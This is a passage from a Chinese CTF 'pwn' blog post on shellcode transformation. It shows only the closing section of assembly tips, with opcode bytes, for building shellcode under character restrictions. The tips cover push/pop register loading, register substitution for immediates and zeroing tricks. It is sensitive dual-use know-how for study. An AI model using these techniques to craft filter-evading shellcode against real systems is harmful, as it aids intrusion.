<h1 id="编写-code-时的一些小技巧"><a href="#编写-code-时的一些小技巧" class="headerlink" title="编写 code 时的一些小技巧"></a>编写 code 时的一些小技巧</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、用push、pop来给寄存其赋值</span><br><span class="line">push rax</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、用寄存器代替操作数</span><br><span class="line">xor byte ptr [rax + <span class="number">0x40</span>], <span class="number">0x50</span>              <span class="number">80</span> <span class="number">70</span> <span class="number">40</span> <span class="number">50</span></span><br><span class="line">可用如下代码代替</span><br><span class="line">push <span class="number">0x50</span>                                    6a <span class="number">50</span></span><br><span class="line">pop rcx                                      <span class="number">59</span></span><br><span class="line">xor byte ptr [rax + <span class="number">0x40</span>], cl                <span class="number">30</span> <span class="number">48</span> <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、清零某一寄存器可用如下代码</span><br><span class="line">push <span class="number">0x30</span>                                    6a <span class="number">30</span></span><br><span class="line">pop rax                                      <span class="number">58</span></span><br><span class="line">xor al, <span class="number">0x30</span>                                 <span class="number">34</span> <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、尽量使用al、bl、cl而非dl</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、有时候交换两个寄存器的位置可以减小机器码值的大小</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2021/01/14/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-3%EF%BC%89-shellcode%E5%8F%98%E5%BD%A2%E7%9A%84%E8%89%BA%E6%9C%AF%EF%BC%88x86%E5%92%8Cx64%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9C%BA%E5%88%B6%EF%BC%9Aretfq%EF%BC%89/">https://cyberangel.cn/2021/01/14/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-3%EF%BC%89-shellcode%E5%8F%98%E5%BD%A2%E7%9A%84%E8%89%BA%E6%9C%AF%EF%BC%88x86%E5%92%8Cx64%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9C%BA%E5%88%B6%EF%BC%9Aretfq%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/17/PWN-Trick%EF%BC%881-4-2%EF%BC%89-chunk%20Extend!Overlapping+malloc%20to%20unsortedbin%E5%88%87%E5%89%B2+malloc==%E5%86%85%E5%AD%98%E9%87%8D%E5%8F%A0/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN-Trick（1-4-2）-chunk Extend/Overlapping+malloc to unsortedbin切割+malloc==内存重叠</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/11/PWN-Trick%EF%BC%881-1%EF%BC%89-ret2one_gadget%EF%BC%88stack%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN-Trick（1-1）-ret2one_gadget（stack）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cyberangel</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8-shellcode"><span class="toc-number">2.</span> <span class="toc-text">直接调用 shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-sandbox-%E7%A6%81%E7%94%A8-system%E3%80%81execve-%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">利用 sandbox 禁用 system、execve 函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6-shellcode-%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">限制 shellcode 中的字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E9%99%90%E5%88%B6-shellcode-%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-number">5.</span> <span class="toc-text">进一步限制 shellcode 的字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E5%AF%B9%E5%BA%94%E8%A6%81%E6%B1%82%E7%9A%84-shellcode"><span class="toc-number">6.</span> <span class="toc-text">使用工具生成对应要求的 shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#x86-ELF%EF%BC%88msfvenom%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">x86 ELF（msfvenom）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64-ELFshellcode-encoder"><span class="toc-number">6.2.</span> <span class="toc-text">x64 ELFshellcode_encoder</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%81%E7%94%A8-system-%E5%92%8C-open%EF%BC%8C%E5%B9%B6%E9%99%90%E5%88%B6-shellcode-%E5%AD%97%E7%AC%A6"><span class="toc-number">7.</span> <span class="toc-text">禁用 system 和 open，并限制 shellcode 字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99-code-%E6%97%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">8.</span> <span class="toc-text">编写 code 时的一些小技巧</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用mprotect修改程序段权限为可执行"/></a><div class="content"><a class="title" href="/2021/06/10/%E5%88%A9%E7%94%A8mprotect%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E6%AE%B5%E6%9D%83%E9%99%90%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C/" title="利用mprotect修改程序段权限为可执行">利用mprotect修改程序段权限为可执行</a><time datetime="2021-06-10T07:59:46.000Z" title="发表于 2021-06-10 15:59:46">2021-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP（1）--从两道题重新认识SROP attack"/></a><div class="content"><a class="title" href="/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="SROP（1）--从两道题重新认识SROP attack">SROP（1）--从两道题重新认识SROP attack</a><time datetime="2021-05-31T02:14:53.000Z" title="发表于 2021-05-31 10:14:53">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(14)-unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/05/18/how2heap(14)-unsortedbin%20attack/" title="how2heap(14)-unsortedbin attack">how2heap(14)-unsortedbin attack</a><time datetime="2021-05-18T07:48:53.000Z" title="发表于 2021-05-18 15:48:53">2021-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(13)-tcache_stashing_unlink_attack"/></a><div class="content"><a class="title" href="/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack">how2heap(13)-tcache_stashing_unlink_attack</a><time datetime="2021-05-17T02:16:40.000Z" title="发表于 2021-05-17 10:16:40">2021-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap(12)-house of lore"/></a><div class="content"><a class="title" href="/2021/05/14/how2heap(12)-house%20of%20lore/" title="how2heap(12)-house of lore">how2heap(12)-house of lore</a><time datetime="2021-05-14T08:02:54.000Z" title="发表于 2021-05-14 16:02:54">2021-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>